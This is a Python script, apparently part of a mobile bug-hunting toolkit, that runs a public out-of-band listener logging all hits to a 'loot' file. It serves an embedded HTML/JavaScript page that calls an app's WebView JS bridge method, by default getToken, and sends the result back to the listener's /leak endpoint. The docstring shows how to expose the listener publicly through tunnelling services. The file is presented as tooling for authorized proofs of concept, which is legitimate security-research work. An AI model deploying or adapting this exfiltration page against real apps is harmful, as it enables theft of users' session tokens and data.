#!/usr/bin/env python3
"""
oob_server.py — self-hosted out-of-band listener for PoC capture.

Your own infrastructure for YOUR OWN proofs: the PoC page/deep link points here,
and every hit (token exfil, WebView fetch, blind callback) is logged with a
timestamp, source, path, headers, and body.

  oob_server.py --port 8000 --log loot/<pkg>/oob.log
  # expose it: your VPS, or `ssh -R 80:localhost:8000 serveo.net`, cloudflared, ngrok —
  # anything that gives you a public URL YOU control.

Serves a tiny PoC helper at /poc.html?bridge=<name>&method=<m> that calls the named
JS bridge and exfils the result back to /leak — edit freely per finding.
"""
import argparse, datetime, http.server, json, socketserver, urllib.parse

POC_PAGE = """<!doctype html><html><body><h3>authorized PoC</h3><script>
const q = new URLSearchParams(location.search);
const bridge = q.get('bridge') || 'app';
const method = q.get('method') || 'getToken';
function exfil(k, v) {
  fetch('/leak?k=' + encodeURIComponent(k) + '&v=' + encodeURIComponent(String(v)))
    .catch(e => {{ new Image().src = '/leak?k=' + k + '&v=' + encodeURIComponent(String(v)); }});
}
try {{
  if (window[bridge] && typeof window[bridge][method] === 'function') {{
    exfil(bridge + '.' + method, window[bridge][method]());
  }} else {{
    exfil('bridge-missing', bridge + '.' + method + ' not found; bridges=' +
      Object.keys(window).filter(x => !x.startsWith('_')).slice(0, 50).join(','));
  }}
}} catch (e) {{ exfil('error', e.message); }}
exfil('loaded', navigator.userAgent);
</script></body></html>"""

class Handler(http.server.BaseHTTPRequestHandler):
    server_version = "HuntOOB/1.0"

    def _record(self, body=b""):
        rec = {
            "ts": datetime.datetime.now(datetime.timezone.utc).isoformat(),
            "client": self.client_address[0],
            "method": self.command,
            "path": self.path,
            "query": dict(urllib.parse.parse_qsl(urllib.parse.urlsplit(self.path).query)),
            "headers": {k: v for k, v in self.headers.items()},
            "body": body[:4096].decode("utf-8", "replace") if body else "",
        }
        line = json.dumps(rec)
        print(f"[OOB] {rec['ts']} {rec['method']} {rec['path']}")
        if rec["query"]:
            print(f"      query={rec['query']}")
        with open(self.server.logfile, "a") as f:
            f.write(line + "\n")

    def _send(self, content, ctype="text/plain", code=200):
        data = content.encode() if isinstance(content, str) else content
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(data)))
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        self.wfile.write(data)

    def do_GET(self):
        self._record()
        if self.path.startswith("/poc.html"):
            self._send(POC_PAGE, "text/html")
        elif self.path.startswith("/health"):
            self._send("ok")
        else:
            self._send("ok\n")

    def do_POST(self):
        n = int(self.headers.get("Content-Length", 0) or 0)
        body = self.rfile.read(min(n, 65536)) if n else b""
        self._record(body)
        self._send("ok\n")

    def log_message(self, *a):  # silence default stderr logging
        pass

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--port", type=int, default=8000)
    ap.add_argument("--bind", default="0.0.0.0")
    ap.add_argument("--log", required=True)
    a = ap.parse_args()
    import os
    os.makedirs(os.path.dirname(os.path.abspath(a.log)), exist_ok=True)
    with socketserver.ThreadingTCPServer((a.bind, a.port), Handler) as srv:
        srv.allow_reuse_address = True
        srv.logfile = a.log
        print(f"[OOB] listening on {a.bind}:{a.port}  logging -> {a.log}")
        print(f"[OOB] PoC helper: http://<you>:{a.port}/poc.html?bridge=<name>&method=<m>")
        try:
            srv.serve_forever()
        except KeyboardInterrupt:
            print("\n[OOB] stopped.")

if __name__ == "__main__":
    main()
